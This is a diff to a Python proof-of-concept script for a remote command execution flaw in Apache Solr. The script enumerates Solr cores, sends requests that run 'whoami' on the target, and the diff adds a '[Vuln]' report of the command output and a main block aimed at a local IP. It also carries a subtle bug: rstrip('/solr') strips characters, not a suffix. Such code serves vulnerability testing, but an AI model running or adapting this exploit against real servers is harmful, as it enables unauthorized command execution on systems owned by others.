@@ -24,7 +24,7 @@ import json
 
 def poc(url):
     url = url if '://' in url else 'http://' + url
-    url = url.split('#')[0].split('?')[0].rstrip('/')
+    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/solr')
     command = "whoami"
     try:
         core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
@@ -52,6 +52,9 @@ def poc(url):
                 target = url + '/solr/' + jas502n_Core_Name + p
                 result = requests.get(url=target)
                 if result.status_code == 200 and len(result.text) < 65:
-                    return url
+                    return '[Vuln]%s ' % [result.text] + url
     except Exception :
         pass
+
+if __name__ == '__main__':
+    print poc("192.168.1.139:8983")
